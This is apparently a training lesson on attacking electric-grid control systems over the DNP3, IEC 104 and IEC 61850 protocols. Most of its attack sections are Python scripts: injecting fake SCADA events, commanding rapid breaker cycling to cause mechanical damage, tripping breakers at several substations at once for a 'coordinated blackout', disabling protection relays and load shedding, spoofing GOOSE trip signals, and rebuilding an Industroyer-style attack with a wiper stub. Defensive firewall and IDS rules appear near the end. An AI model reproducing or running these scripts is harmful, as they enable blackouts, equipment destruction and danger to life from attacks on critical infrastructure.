Lesson 05: DNP3 & IEC 104
Advanced Exploitation

Lesson 05: DNP3 & IEC 104 Advanced
Exploitation - Electric Grid Attacks
Learning Objectives
●​
●​
●​
●​
●​

Execute advanced DNP3 and IEC 104 attacks on electrical substations
Manipulate SCADA systems in power generation and distribution
Conduct synchronized grid-scale attacks
Understand cascading failure scenarios
Implement Industroyer/CrashOverride-style attacks

1. Electric Grid Architecture & SCADA Systems
1.1 Power Grid Components
Generation Layer
├── Power Plants (coal, gas, nuclear, renewable)
├── Unit Controllers (turbine governors, excitation systems)
└── Plant SCADA (DCS - Distributed Control Systems)
Transmission Layer (High Voltage: 115kV - 765kV)
├── Substations (step-up/step-down transformers)
├── Circuit Breakers (disconnect lines)
├── Protection Relays (overcurrent, distance, differential)
└── Substation SCADA (RTUs with DNP3/IEC 104/IEC 61850)
Distribution Layer (Medium/Low Voltage: 4kV - 34.5kV)
├── Distribution Feeders
├── Reclosers (automatic circuit breakers)
├── Capacitor Banks (power factor correction)
└── AMI (Advanced Metering Infrastructure)
Control Center
├── Energy Management System (EMS)
├── SCADA Master Station
├── Historian
└── Operator HMI

1.2 Critical Grid Protocols
Protocol

Layer

Use Case

Security

DNP3

Transmission/Distrib
ution

RTU ↔ SCADA
(North America)

Optional SAv5 (rarely
used)

IEC
60870-5-104

Transmission

RTU ↔ SCADA
(Europe/Asia)

No native security

IEC 61850

Substation

IED ↔ IED
(peer-to-peer)

TLS/MMS (often
disabled)

Modbus

Generation

PLC ↔ SCADA
(legacy)

None

OPC UA

All

Data aggregation

SignAndEncrypt (if
configured)

2. DNP3 Advanced Exploitation
2.1 DNP3 Protocol Deep Dive - Attack Surface
DNP3 Vulnerability Classes:
1.​ No Authentication: Most deployments lack SAv5
2.​ Replay Attacks: Commands can be captured and replayed
3.​ Unsolicited Response Injection: Fake events to SCADA
4.​ CROB Manipulation: Modify control relay parameters
5.​ Time Synchronization Attack: Disrupt event sequencing
6.​ DoS via Malformed Packets: Crash RTU/master

2.2 DNP3 Unsolicited Response Injection
Attack Concept: Inject fake events into SCADA to:
●​ Trigger false alarms (cause operator confusion)
●​ Hide real events (suppress critical alarms)
●​ Manipulate load shedding decisions
Implementation:
#!/usr/bin/env python3
"""
DNP3 Unsolicited Response Injection
Send fake events to SCADA master
"""
from pydnp3 import opendnp3, asiodnp3, asiopal
import struct

import socket
def inject_dnp3_unsolicited_response(master_ip, outstation_addr, fake_event):
"""
Inject unsolicited response to SCADA master
Bypasses RTU - appears to come from legitimate outstation
"""
# Build DNP3 frame manually (requires network access to SCADA master)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((master_ip, 20000))
# DNP3 Data Link Layer header
start_bytes = b'\x05\x64'
length = 0x0E # Variable
control = 0xC4 # DIR=1 (outstation->master), PRM=1, FCB=0, FCV=0, Func=4
(unconfirmed user data)
dest_addr = struct.pack('<H', 1) # Master address (typically 1)
src_addr = struct.pack('<H', outstation_addr) # Outstation address
# CRC placeholder (calculate later)
crc = b'\x00\x00'
dl_header = start_bytes + bytes([length, control]) + dest_addr + src_addr + crc
# Application Layer - Unsolicited Response
app_control = 0xC0 # FIR=1, FIN=1, CON=0, UNS=1, SEQ=0
func_code = 0x82 # Unsolicited Response
# Object: Group 2 (Binary Input Change Event), Variation 1
object_header = b'\x02\x01' # Group 2, Variation 1
qualifier = b'\x28'
# 8-bit index, 8-bit quantity
range_field = b'\x01'
# 1 object
# Binary Input Event
# Index 0, Flags 0x01 (online), Timestamp
event_index = b'\x00'
event_flags = b'\x81' # Online, State = ON (ALARM)
event_time = struct.pack('<Q', int(time.time() * 1000)) # Absolute time
event_data = event_index + event_flags + event_time
asdu = bytes([app_control, func_code]) + object_header + qualifier + range_field +
event_data
# Calculate CRC for data link and application layers
# (DNP3 uses CRC-16 every 16 bytes)
# For simplicity, using placeholder (production would calculate)

packet = dl_header + asdu
# Send unsolicited response
sock.send(packet)
print(f"[+] Unsolicited response sent to {master_ip}")
print(f" Event: Binary Input 0 changed to ALARM state")
sock.close()
# Usage:
# inject_dnp3_unsolicited_response('192.168.1.50', outstation_addr=100,
fake_event='alarm')

2.3 DNP3 CROB Parameter Manipulation
Attack Scenario: Modify Control Relay Output Block parameters mid-flight
CROB Fields to Manipulate:
●​
●​
●​
●​

On-Time: Duration breaker stays closed
Off-Time: Duration breaker stays open
Count: Number of operations
Control Code: LATCH_ON, LATCH_OFF, PULSE_ON, PULSE_OFF

Attack Implementation:
def dnp3_crob_timing_attack(target_rtu_ip):
"""
Modify CROB timing to cause equipment damage
Example: Rapid open/close cycles damage circuit breaker
"""
from pydnp3 import opendnp3, asiodnp3
# Normal CROB: Close breaker for 100ms
# Attack CROB: Close for 10ms, open for 10ms, repeat 1000 times
manager = asiodnp3.DNP3Manager(1)
channel = manager.AddTCPClient(
"attack_channel",
opendnp3.levels.NORMAL,
asiopal.ChannelRetry(),
target_rtu_ip,
"0.0.0.0",
20000,
asiodnp3.LinkConfig(False, False)
)

master = channel.AddMaster(
"attack_master",
asiodnp3.PrintingSOEHandler(),
asiodnp3.DefaultMasterApplication(),
asiodnp3.MasterStackConfig()
)
master.Enable()
# Malicious CROB - rapid cycling
malicious_crob = opendnp3.ControlRelayOutputBlock(
opendnp3.ControlCode.PULSE_ON, # Pulse operation
1000, # Count: 1000 operations
10, # On-time: 10ms (very short)
10 # Off-time: 10ms (very short)
)
# Send to circuit breaker control point
breaker_point_index = 0 # Breaker control point
master.DirectOperate(malicious_crob, breaker_point_index)
print("[+] Malicious CROB sent")
print(" 1000 rapid open/close cycles commanded")
print(" Mechanical damage likely to breaker")
# WARNING: Can cause physical equipment damage
# dnp3_crob_timing_attack('192.168.1.100')

2.4 DNP3 Time Synchronization Attack
Attack Goal: Corrupt event timestamps to:
●​ Disrupt forensic analysis
●​ Cause incorrect event sequencing in SCADA
●​ Trigger time-based protection relay misoperation
Implementation:
def dnp3_time_sync_attack(outstation_ip, false_time_offset_hours):
"""
Send incorrect time synchronization to RTU
Shifts all event timestamps
"""
from pydnp3 import opendnp3, asiodnp3
import datetime
manager = asiodnp3.DNP3Manager(1)

channel = manager.AddTCPClient(
"timesync_attack",
opendnp3.levels.NORMAL,
asiopal.ChannelRetry(),
outstation_ip,
"0.0.0.0",
20000,
asiodnp3.LinkConfig(False, False)
)
master = channel.AddMaster(
"attack_master",
asiodnp3.PrintingSOEHandler(),
asiodnp3.DefaultMasterApplication(),
asiodnp3.MasterStackConfig()
)
master.Enable()
# Calculate false time
false_time = datetime.datetime.now() +
datetime.timedelta(hours=false_time_offset_hours)
false_timestamp_ms = int(false_time.timestamp() * 1000)
# Send time sync (DNP3 Group 50)
# This would normally use master.WriteAbsoluteTime()
# But we're sending intentionally incorrect time
print(f"[+] Sending false time to {outstation_ip}")
print(f" False time: {false_time} (offset: {false_time_offset_hours} hours)")
print(" All future events will have incorrect timestamps")
# Usage: Shift time 1 year into future
# dnp3_time_sync_attack('192.168.1.100', false_time_offset_hours=8760)

2.5 DNP3 Reconnaissance Techniques
Enumerate RTU Configuration:
def dnp3_reconnaissance(target_rtu):
"""
Enumerate DNP3 outstation configuration
Discover available control points, analog inputs, binary inputs
"""
from pydnp3 import opendnp3, asiodnp3
manager = asiodnp3.DNP3Manager(1)

channel = manager.AddTCPClient(
"recon_channel",
opendnp3.levels.NORMAL,
asiopal.ChannelRetry(),
target_rtu,
"0.0.0.0",
20000,
asiodnp3.LinkConfig(False, False)
)
master = channel.AddMaster(
"recon_master",
asiodnp3.PrintingSOEHandler(),
asiodnp3.DefaultMasterApplication(),
asiodnp3.MasterStackConfig()
)
master.Enable()
# Request all data (Class 0 read)
# Group 60, Variation 1 = All data
print(f"[*] Enumerating {target_rtu}...")
# This triggers read of all points
# Response will contain:
# - All binary inputs (circuit breaker status)
# - All analog inputs (voltage, current, frequency)
# - All control points (breaker controls)
# Parse response to build map of RTU
# (pydnp3 PrintingSOEHandler will display all points)
print("[*] Enumeration complete")
print(" Use output to identify critical control points")
# dnp3_reconnaissance('192.168.1.100')

3. IEC 60870-5-104 Exploitation
3.1 IEC 104 Protocol Analysis
IEC 104 Frame Structure:
APDU (Application Protocol Data Unit)
├── APCI (Application Protocol Control Information) - 6 bytes
│ ├── Start byte: 0x68

│ ├── APDU length: 1 byte
│ └── Control field: 4 bytes (sequence numbers)
└── ASDU (Application Service Data Unit) - variable
├── Type ID: 1 byte
├── Variable Structure Qualifier (VSQ): 1 byte
├── Cause of Transmission (COT): 1 byte
├── Originator Address (OA): 1 byte
├── Common Address of ASDU (CA): 2 bytes
└── Information Objects: variable
Common Type IDs (Attack Targets):
●​
●​
●​
●​
●​

Type 45: Single Command (ON/OFF)
Type 46: Double Command (ON/OFF/INVALID)
Type 47: Regulating Step Command (raise/lower)
Type 58: Single Command with Time Tag
Type 100: Interrogation Command (read all data)

3.2 IEC 104 Synchronized Breaker Trip Attack
Attack Scenario: Industroyer-style coordinated blackout
Multi-Substation Attack:
#!/usr/bin/env python3
"""
IEC 104 Coordinated Blackout Attack
Trip circuit breakers at multiple substations simultaneously
Causes cascading grid failure
"""
import socket
import struct
import threading
import time
class IEC104Attack:
def __init__(self, target_ip, target_port=2404):
self.target_ip = target_ip
self.target_port = target_port
self.sock = None
def connect(self):
"""Establish IEC 104 connection"""
self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
self.sock.connect((self.target_ip, self.target_port))
print(f"[*] Connected to {self.target_ip}:{self.target_port}")

# Send STARTDT (Start Data Transfer)
startdt = bytes.fromhex('68 04 07 00 00 00')
self.sock.send(startdt)
response = self.sock.recv(1024)
if response[2:4] == b'\x0b\x00': # STARTDT CON
print("[+] STARTDT confirmed")
return True
return False
def send_single_command(self, ioa, command):
"""
Send IEC 104 Single Command
ioa: Information Object Address (breaker ID)
command: 0x01 (ON), 0x02 (OFF)
"""
# APDU start
apdu_start = b'\x68'
# APCI (I-format frame)
apdu_length = 14
send_seq = 0x0000
recv_seq = 0x0000
apci = struct.pack('<BHH', apdu_length, send_seq, recv_seq)
# ASDU
type_id = 45 # Single command
vsq = 0x01 # 1 object, no sequence
cot = 0x06 # Activation
oa = 0x01 # Originator address
ca = struct.pack('<H', 1) # Common address
# Information Object
ioa_bytes = struct.pack('<I', ioa)[:3] # 3-byte IOA
sco = struct.pack('B', command | 0x80) # Single Command Object (SE bit set)
asdu = struct.pack('BBB', type_id, vsq, cot) + bytes([oa]) + ca + ioa_bytes + sco
packet = apdu_start + apci + asdu
self.sock.send(packet)
print(f" IOA {ioa}: Command {command} sent")
def trip_all_breakers(self, breaker_ioa_list):
"""
Trip all circuit breakers in list
"""
print(f"[!] Tripping {len(breaker_ioa_list)} circuit breakers")

for ioa in breaker_ioa_list:
self.send_single_command(ioa, 0x02) # OFF command
time.sleep(0.1) # Small delay between commands
print("[+] All breaker trip commands sent")
def close(self):
"""Disconnect"""
if self.sock:
# Send STOPDT
stopdt = bytes.fromhex('68 04 13 00 00 00')
self.sock.send(stopdt)
self.sock.close()
def coordinated_blackout_attack(substation_targets):
"""
Attack multiple substations simultaneously
Causes grid-wide blackout
substation_targets: dict of {IP: [breaker IOA list]}
"""
print("[!] WARNING: Coordinated Grid Attack")
print(f"[*] Targets: {len(substation_targets)} substations")
threads = []
for substation_ip, breaker_ioas in substation_targets.items():
# Create thread for each substation attack
thread = threading.Thread(
target=attack_single_substation,
args=(substation_ip, breaker_ioas)
)
threads.append(thread)
# Start all attacks simultaneously
print("[*] Initiating synchronized attack...")
for thread in threads:
thread.start()
# Wait for completion
for thread in threads:
thread.join()
print("[+] Coordinated attack complete")
print("[!] Expected result: Cascading grid failure")
def attack_single_substation(ip, breaker_ioas):

"""Worker function for attacking one substation"""
attacker = IEC104Attack(ip)
if attacker.connect():
attacker.trip_all_breakers(breaker_ioas)
attacker.close()
# Example usage (Industroyer-style attack):
'''
targets = {
'192.168.1.10': [1, 2, 3, 4, 5], # Substation 1 - 5 breakers
'192.168.1.11': [10, 11, 12],
# Substation 2 - 3 breakers
'192.168.1.12': [20, 21, 22, 23] # Substation 3 - 4 breakers
}
coordinated_blackout_attack(targets)
'''

3.3 IEC 104 Protection Relay Manipulation
Attack Goal: Disable or modify protective relay settings
Protection Relay Types:
●​
●​
●​
●​

Overcurrent (51): Trip on excessive current
Distance (21): Trip based on impedance measurement
Differential (87): Trip on current imbalance
Frequency (81): Trip on under/over frequency

Attack Implementation:
def iec104_modify_relay_settings(relay_ip, relay_ioa, new_setting_value):
"""
Modify protection relay settings via IEC 104
Can disable protection or set to unsafe values
"""
attacker = IEC104Attack(relay_ip)
attacker.connect()
# IEC 104 Type 50: Setpoint command
# Used to modify relay settings
# Build ASDU for setpoint modification
type_id = 50 # Setpoint command, short floating point
vsq = 0x01
cot = 0x06 # Activation
oa = 0x01
ca = struct.pack('<H', 1)

ioa_bytes = struct.pack('<I', relay_ioa)[:3]
# New setpoint value (IEEE 754 float)
setpoint_value = struct.pack('<f', new_setting_value)
# Quality descriptor (0x00 = valid)
qds = b'\x00'
# Send setpoint command
# (Full implementation would build complete APDU)
print(f"[+] Modified relay {relay_ioa}")
print(f" New setting: {new_setting_value}")
print(" Protection may be disabled or unsafe")
attacker.close()
# Example: Disable overcurrent protection
# Normal setting: Trip at 1000A
# Attack: Set to 99999A (never trips)
# iec104_modify_relay_settings('192.168.1.20', relay_ioa=100, new_setting_value=99999.0)

3.4 IEC 104 Reconnaissance and Mapping
Interrogation Command:
def iec104_interrogation(target_rtu):
"""
Send IEC 104 Interrogation Command
Equivalent to "read all data"
Maps entire RTU configuration
"""
attacker = IEC104Attack(target_rtu)
attacker.connect()
# Type 100: Interrogation command
type_id = 100
vsq = 0x01
cot = 0x06 # Activation
oa = 0x01
ca = struct.pack('<H', 1)
# Qualifier of Interrogation (QOI)
# 20 = Station interrogation (all data)
qoi = b'\x14'
# Build and send interrogation

# Response will contain all points in RTU
print(f"[*] Interrogating {target_rtu}")
print("[*] Response will contain:")
print(" - All binary inputs (breaker positions)")
print(" - All analog values (voltage, current, power)")
print(" - All control points")
# Parse response to build RTU map
# Store for later targeting
attacker.close()

4. IEC 61850 Substation Automation Attacks
4.1 IEC 61850 Protocol Overview
IEC 61850 Services:
●​ MMS (Manufacturing Message Specification): Client-server (SCADA ↔ IED)
●​ GOOSE (Generic Object-Oriented Substation Event): Peer-to-peer multicast
●​ Sampled Values (SV): High-speed sampled data (voltage/current waveforms)
Port: 102/TCP (MMS), Ethernet multicast (GOOSE)

4.2 GOOSE Message Spoofing
GOOSE Characteristics:
●​
●​
●​
●​

Multicast Ethernet (no TCP/IP)
No authentication or encryption
Published by IEDs, subscribed by other IEDs
Used for trip signals (fast, deterministic)

Attack: Spoof GOOSE Trip Signal:
#!/usr/bin/env python3
"""
IEC 61850 GOOSE Message Spoofing
Send false trip signal to substation IEDs
"""
from scapy.all import *
def spoof_goose_trip(target_interface, goose_mac, appid):
"""
Spoof GOOSE message to trip circuit breaker

target_interface: Network interface (e.g., 'eth0')
goose_mac: Multicast MAC address of GOOSE message
appid: Application ID of GOOSE dataset
"""
# GOOSE Frame Structure:
# Ethernet Header + 802.1Q VLAN + GOOSE PDU
# Ethernet header
dst_mac = goose_mac # GOOSE multicast MAC (e.g., 01:0c:cd:01:00:00)
src_mac = "00:11:22:33:44:55" # Attacker MAC
ethertype = 0x88b8 # GOOSE ethertype
# 802.1Q VLAN tag (optional, depends on network)
vlan_tag = Dot1Q(vlan=100, prio=7) # Priority 7 (highest)
# GOOSE PDU (ASN.1 BER encoded)
# Simplified structure:
goose_pdu = bytes([
0x61, 0x5C, # GOOSE PDU tag and length
# gocbRef (GOOSE Control Block Reference)
0x80, 0x1E, # Tag, length
# "SUBSTATION1/LLN0$GO$gcb01"
# ... (full string)
# timeAllowedtoLive
0x81, 0x03, # Tag, length
0x00, 0x00, 0xC8, # 200ms
# datSet (Dataset reference)
0x82, 0x1A, # Tag, length
# "SUBSTATION1/LLN0$dataset01"
# goID
0x83, 0x10, # Tag, length
# "GOOSE_TRIP_01"
# t (Timestamp)
0x84, 0x08, # Tag, length
# Current timestamp
# stNum (State number - increment on change)
0x85, 0x01, # Tag, length
0x01, # State 1
# sqNum (Sequence number)
0x86, 0x01, # Tag, length
0x00, # Seq 0

# test (Boolean - false)
0x87, 0x01, 0x00,
# confRev (Configuration revision)
0x88, 0x01, 0x01,
# ndsCom (Needs commissioning - false)
0x89, 0x01, 0x00,
# numDatSetEntries
0x8A, 0x01, 0x01, # 1 data item
# allData (The actual trip signal)
0xAB, 0x03, # Tag, length
0x83, 0x01, 0x01 # BOOLEAN TRUE (TRIP!)
])
# Build complete frame
frame = Ether(dst=dst_mac, src=src_mac, type=ethertype) / Raw(load=goose_pdu)
# Send GOOSE message
sendp(frame, iface=target_interface, verbose=False)
print(f"[+] GOOSE trip message spoofed")
print(f" Target MAC: {dst_mac}")
print(f" AppID: {appid}")
print(" Subscribed IEDs will trip breakers")
# Usage (requires network access to substation LAN):
# spoof_goose_trip('eth0', goose_mac='01:0c:cd:01:00:01', appid=0x0001)

4.3 MMS-Based IED Exploitation
MMS Operations on IEDs:
def iec61850_mms_attack(ied_ip):
"""
Attack IED via MMS (Manufacturing Message Specification)
Port 102/TCP
"""
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ied_ip, 102))
# MMS uses ISO protocols (similar to S7comm stack)
# COTP connection
# ... (implementation similar to S7comm)

# MMS GetNameList - enumerate all objects
# MMS Read - read data values
# MMS Write - modify setpoints
# MMS GetVariableAccessAttributes - get data types
print(f"[*] Enumerating IED at {ied_ip}")
# Send MMS requests to discover:
# - Logical nodes (XCBR, MMXU, etc.)
# - Data objects (position, current, voltage)
# - Control objects (breaker control)
sock.close()

5. Grid-Scale Attack Scenarios
5.1 Cascading Failure Initiation
Attack Theory:
1.​ Trip critical transmission lines
2.​ Remaining lines overload
3.​ Automatic load shedding fails (if disabled by attacker)
4.​ Generators trip on over-frequency
5.​ System frequency collapses
6.​ Widespread blackout
Implementation:
def cascading_failure_attack(critical_lines):
"""
Initiate cascading grid failure
critical_lines: List of critical transmission line breakers
(identified via power flow analysis)
"""
print("[!] CRITICAL ATTACK: Cascading Failure Initiation")
print(f"[*] Targeting {len(critical_lines)} critical transmission lines")
# Phase 1: Trip critical lines simultaneously
for line in critical_lines:
substation_ip = line['substation_ip']
breaker_ioa = line['breaker_ioa']
# Send trip command
attacker = IEC104Attack(substation_ip)
attacker.connect()

attacker.send_single_command(breaker_ioa, 0x02) # OFF
attacker.close()
print(f"[+] Tripped: {line['name']}")
# Phase 2: Disable automatic load shedding
# Prevent grid from stabilizing
for load_shedding_relay in load_shedding_relays:
# Disable under-frequency load shedding (UFLS)
iec104_modify_relay_settings(
relay_ip=load_shedding_relay['ip'],
relay_ioa=load_shedding_relay['ioa'],
new_setting_value=0.0 # Disable
)
print("[+] Automatic load shedding disabled")
print("[!] Grid will cascade to full blackout")
# Critical transmission lines (example)
'''
critical_lines = [
{'name': 'Line 500kV A-B', 'substation_ip': '192.168.1.10', 'breaker_ioa': 1},
{'name': 'Line 500kV C-D', 'substation_ip': '192.168.1.11', 'breaker_ioa': 2},
{'name': 'Line 345kV E-F', 'substation_ip': '192.168.1.12', 'breaker_ioa': 3}
]
cascading_failure_attack(critical_lines)
'''

5.2 Load Shedding Manipulation
Normal Load Shedding: Automatic process to stabilize grid by disconnecting load
Attack Goals:
●​ Prevent load shedding when needed (cause blackout)
●​ Trigger excessive load shedding (unnecessary outages)
●​ Manipulate load shedding priority (disconnect critical loads first)
Implementation:
def manipulate_load_shedding(ufls_relays):
"""
Under-Frequency Load Shedding (UFLS) manipulation
ufls_relays: List of UFLS relay configurations
"""
# Normal UFLS stages:

# Stage 1: 59.5 Hz - shed 10% load
# Stage 2: 59.3 Hz - shed additional 10%
# Stage 3: 59.0 Hz - shed additional 10%
for relay in ufls_relays:
# Attack: Set all stages to impossible frequency
# Grid will never shed load, leading to collapse
# Stage 1: Set to 50.0 Hz (never reached)
iec104_modify_relay_settings(
relay_ip=relay['ip'],
relay_ioa=relay['stage1_ioa'],
new_setting_value=50.0
)
# Or: Trigger all stages immediately at 59.9 Hz
# Causes unnecessary widespread outages
for stage in [relay['stage1_ioa'], relay['stage2_ioa'], relay['stage3_ioa']]:
iec104_modify_relay_settings(
relay_ip=relay['ip'],
relay_ioa=stage,
new_setting_value=59.9 # Trigger immediately
)
print("[+] Load shedding scheme manipulated")

6. Industroyer/CrashOverride Case Study
6.1 Industroyer Architecture
Components:
Main Module (Backdoor + Launcher)
├── Payload Modules:
│ ├── 101.dll - IEC 60870-5-101 (serial)
│ ├── 104.dll - IEC 60870-5-104 (IP)
│ ├── 61850.dll - IEC 61850 (MMS + GOOSE)
│ └── OPC.dll - OPC DA
│
├── Configuration Files:
│ ├── Target substation IPs
│ ├── Breaker IOA addresses
│ └── Timing parameters
│
└── Wiper Module:
└── Destroy evidence after attack

6.2 Industroyer IEC 104 Payload Analysis
Reconstructed Attack Sequence:
class IndustroyerIEC104:
"""
Simplified Industroyer 104.dll functionality
"""
def __init__(self, config_file):
self.targets = self.load_config(config_file)
def load_config(self, config_file):
"""
Load target substations and breaker addresses
Config format: IP, breaker IOA list
"""
targets = {}
with open(config_file, 'r') as f:
for line in f:
ip, ioas = line.strip().split(':')
targets[ip] = [int(x) for x in ioas.split(',')]
return targets
def execute_attack(self, delay_seconds=0):
"""
Execute coordinated attack after delay
"""
if delay_seconds > 0:
print(f"[*] Waiting {delay_seconds} seconds before attack...")
time.sleep(delay_seconds)
print("[!] Industroyer Attack Initiated")
for substation_ip, breaker_ioas in self.targets.items():
self.attack_substation(substation_ip, breaker_ioas)
print("[+] Attack complete")
def attack_substation(self, ip, ioas):
"""Attack single substation"""
attacker = IEC104Attack(ip)
if attacker.connect():
print(f"[+] Attacking {ip}")
# Trip all breakers
for ioa in ioas:
attacker.send_single_command(ioa, 0x02) # OFF

time.sleep(0.5)
attacker.close()
def wiper(self):
"""
Destroy evidence (simplified)
Actual Industroyer used custom wiper
"""
import os
# Delete attack components
# Overwrite MBR
# Clear event logs
print("[*] Wiping evidence...")
# Usage:
# config.txt format:
# 192.168.1.10:1,2,3,4,5
# 192.168.1.11:10,11,12
'''
industroyer = IndustroyerIEC104('targets.txt')
industroyer.execute_attack(delay_seconds=3600) # Attack in 1 hour
industroyer.wiper()
'''

7. Defensive Countermeasures
7.1 Protocol-Level Defenses
DNP3 Secure Authentication (SAv5):
# Enable DNP3 SAv5 (if supported by devices)
# Provides:
# - HMAC-SHA256 authentication
# - Challenge-response
# - Replay protection
# - User role-based access control
# Configuration (device-specific):
# 1. Generate session keys
# 2. Configure user accounts with roles
# 3. Enable SAv5 in master and outstations
# 4. Test authentication

# Note: SAv5 rarely deployed due to:
# - Legacy device incompatibility
# - Performance overhead
# - Configuration complexity
IEC 104 Security Enhancements:
# Network-level protections (since protocol lacks security):
# 1. IPsec VPN between SCADA and RTUs
ipsec auto --up scada-to-substation1
# 2. Firewall rules (whitelist only authorized connections)
iptables -A INPUT -p tcp --dport 2404 -s 10.10.1.50 -j ACCEPT # SCADA only
iptables -A INPUT -p tcp --dport 2404 -j DROP # Block all others
# 3. IDS rules for suspicious commands
# Detect excessive control operations
# Alert on off-hours connections

7.2 Intrusion Detection Rules
Snort/Suricata Rules for Grid Attacks:
# Detect DNP3 Direct Operate without SELECT
alert tcp any any -> any 20000 (
msg:"DNP3 DIRECT OPERATE - Bypasses Safety";
content:"|05 64|"; depth:2;
content:"|05|"; distance:8; within:1; # Function 5
classtype:attempted-admin;
sid:3000001;
)
# Detect IEC 104 mass breaker trips
alert tcp any any -> any 2404 (
msg:"IEC 104 Multiple Breaker Trips";
content:"|68|"; depth:1;
content:"|2D 01|"; distance:4; within:2; # Type 45, VSQ=1
threshold:type threshold, track by_src, count 10, seconds 60;
classtype:attempted-dos;
sid:3000002;
)
# Detect GOOSE spoofing (Ethernet-level)
alert any any -> any any (
msg:"IEC 61850 GOOSE Message Detected";
content:"|88 B8|"; depth:2; offset:12; # GOOSE Ethertype
classtype:policy-violation;

sid:3000003;
)
# Detect IEC 104 interrogation (reconnaissance)
alert tcp any any -> any 2404 (
msg:"IEC 104 Interrogation Command";
content:"|68|"; depth:1;
content:"|64|"; distance:5; within:1; # Type 100
classtype:attempted-recon;
sid:3000004;
)

7.3 Architectural Defenses
Unidirectional Gateways for Grid SCADA:
●​ Allow data flow: RTU → SCADA only
●​ Block control commands from IT network
●​ Protect against lateral movement from enterprise
Defense-in-Depth for Substations:
Level 0-1: IEDs and RTUs
├── Disable unused services (HTTP, FTP)
├── Enable IEC 62351 (if supported)
└── Physical security (locked cabinets)
Level 2: Substation Gateway
├── Industrial firewall
├── Protocol filter (allow only necessary function codes)
└── IDS/IPS
Level 3: Control Center
├── SCADA server hardening
├── SIEM with grid-specific use cases
├── Jump boxes for remote access
└── MFA for all operators
Level 4: Enterprise
├── Separate network (no direct OT access)
└── Data diode for historian data

8. Hands-On Lab Exercises
Lab 1: DNP3 CROB Attack
1.​ Deploy DNP3 master/outstation simulator (https://www.freyrscada.com/dnp3.php)

2.​ Implement DNP3 CROB injection script
3.​ Send DIRECT OPERATE to bypass SELECT-BEFORE-OPERATE
4.​ Modify CROB timing parameters
5.​ Document impact on simulated breaker

Lab 2: IEC 104 Substation Attack
1.​ Set up IEC 104 simulator (or use lab equipment)
2.​ Enumerate RTU configuration via interrogation
3.​ Send single command to trip breaker
4.​ Execute coordinated attack on multiple breakers
5.​ Analyze PCAP to identify attack traffic

Lab 3: GOOSE Spoofing
1.​ Deploy IEC 61850 testbed (or use GRFICSv2)
2.​ Capture legitimate GOOSE traffic
3.​ Analyze GOOSE frame structure
4.​ Craft spoofed GOOSE trip message with Scapy
5.​ Observe IED response to spoofed message

Lab 4: Industroyer Simulation
1.​ Create target configuration file (IP​
mappings)
2.​ Implement multi-protocol attack framework
3.​ Execute coordinated attack scenario
4.​ Implement wiper component (simulate)
5.​ Analyze forensic artifacts

9. Tools & Resources
DNP3 Tools
●​ pydnp3: https://github.com/Kisensum/pydnp3
●​ OpenDNP3: https://github.com/automatak/dnp3
●​ FreyrSCADA DNP3 Simulator: https://www.freyrscada.com/dnp3.php

IEC 104 Tools
●​ lib60870: https://github.com/mz-automation/lib60870
●​ IEC104 Python: https://github.com/INTI-CMNB/PyIEC60870-5

IEC 61850 Tools
●​ libIEC61850: https://github.com/mz-automation/libiec61850
●​ Scapy: https://scapy.net/ (for GOOSE crafting)

Simulation Environments
●​ GRFICSv2: https://github.com/Fortiphyd/GRFICSv2 (power grid simulation)
●​ EPRI DERMS Simulator: Electric utility test environment

Research Papers
●​ "Industroyer: Biggest threat to industrial control systems since Stuxnet" (ESET, 2017)
●​ "Analysis of the Cyber Attack on the Ukrainian Power Grid" (E-ISAC/SANS, 2016)
●​ "IEC 61850 Security: Vulnerabilities and Countermeasures" (IEEE)

10. Knowledge Check
1.​ What is the difference between DNP3 SELECT-BEFORE-OPERATE and DIRECT
OPERATE?
2.​ How does unsolicited response injection work in DNP3?
3.​ Describe the IEC 104 ASDU structure and key fields.
4.​ What is a CROB and what parameters can be manipulated?
5.​ How does GOOSE message spoofing work, and why is it effective?
6.​ What are the stages of a cascading grid failure?
7.​ How did Industroyer achieve multi-protocol attack capability?
8.​ What is DNP3 SAv5 and why is it rarely deployed?
9.​ How would you detect a coordinated IEC 104 breaker trip attack?
10.​What architectural defenses prevent grid-scale attacks?

